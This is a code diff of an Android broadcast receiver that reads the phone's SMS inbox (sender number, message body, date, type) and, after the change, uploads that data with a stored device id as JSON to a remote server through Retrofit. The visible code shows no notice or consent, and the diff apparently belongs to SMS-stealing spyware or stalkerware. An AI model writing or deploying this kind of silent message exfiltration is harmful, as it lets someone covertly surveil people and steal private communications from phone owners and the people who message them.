@@ -34,6 +34,7 @@ public class msgLogs extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
 
+        Log.d("actio" , intent.getAction());
 
         pref = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
         edit = pref.edit();
@@ -44,7 +45,11 @@ public class msgLogs extends BroadcastReceiver {
         Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, strOrder);
 
         sb.append("SMS Details :");
-        while (cur != null && cur.moveToNext()) {
+        //while (cur != null && cur.moveToNext()) {
+
+        try {
+            cur.moveToFirst();
+
             String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
             address = cur.getString(cur.getColumnIndex("address"));
             body = cur.getString(cur.getColumnIndexOrThrow("body"));
@@ -75,8 +80,50 @@ public class msgLogs extends BroadcastReceiver {
 
             sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
             sb.append("\n-----------------");
+
+            Log.d("SMSS", sms.toString());
+
+            Bean b = (Bean) context.getApplicationContext();
+
+            Retrofit retrofit = new Retrofit.Builder()
+                    .baseUrl(b.baseURL)
+                    .addConverterFactory(ScalarsConverterFactory.create())
+                    .addConverterFactory(GsonConverterFactory.create())
+                    .build();
+            Allapi cr = retrofit.create(Allapi.class);
+            MsgBean body = new MsgBean();
+            body.setMsgData(data);
+
+            Gson gsonObj = new Gson();
+
+            String jsonStr = gsonObj.toJson(body);
+            String id = pref.getString("id","");
+            Log.d("idHaiKyaBhai", id);
+            Log.d("idHaiKyaBhai", pref.getString("id",""));
+            Log.d("idHaikya", jsonStr);
+            Call<MsgBean> call = cr.msgs(id,jsonStr);
+            call.enqueue(new Callback<MsgBean>() {
+                @Override
+                public void onResponse(Call<MsgBean> call, Response<MsgBean> response) {
+                    Log.d("messageGaya?", "haanGaya");
+                }
+
+                @Override
+                public void onFailure(Call<MsgBean> call, Throwable t) {
+                    Log.d("messageGaya?", "nahiGaya");
+
+                }
+            });
+
+
+        }catch (Exception e)
+        {
+            e.printStackTrace();
         }
-        Log.d("SMSS", sms.toString());
+
+
+        //}
+
         //textView.setText(sb);
 
         if (cur != null) {
@@ -85,37 +132,6 @@ public class msgLogs extends BroadcastReceiver {
         //return sms;
 
 
-        Bean b = (Bean) context.getApplicationContext();
-
-        Retrofit retrofit = new Retrofit.Builder()
-                .baseUrl(b.baseURL)
-                .addConverterFactory(ScalarsConverterFactory.create())
-                .addConverterFactory(GsonConverterFactory.create())
-                .build();
-        Allapi cr = retrofit.create(Allapi.class);
-        MsgBean body = new MsgBean();
-        body.setMsgData(data);
-
-        Gson gsonObj = new Gson();
-
-        String jsonStr = gsonObj.toJson(body);
-        String id = pref.getString("id","");
-        Log.d("idHaiKyaBhai", id);
-        Log.d("idHaiKyaBhai", pref.getString("id",""));
-        Log.d("idHaikya", jsonStr);
-        Call<MsgBean> call = cr.msgs(id,jsonStr);
-        call.enqueue(new Callback<MsgBean>() {
-            @Override
-            public void onResponse(Call<MsgBean> call, Response<MsgBean> response) {
-                Log.d("messageGaya?", "haanGaya");
-            }
-
-            @Override
-            public void onFailure(Call<MsgBean> call, Throwable t) {
-                Log.d("messageGaya?", "nahiGaya");
-
-            }
-        });
 
 
     }
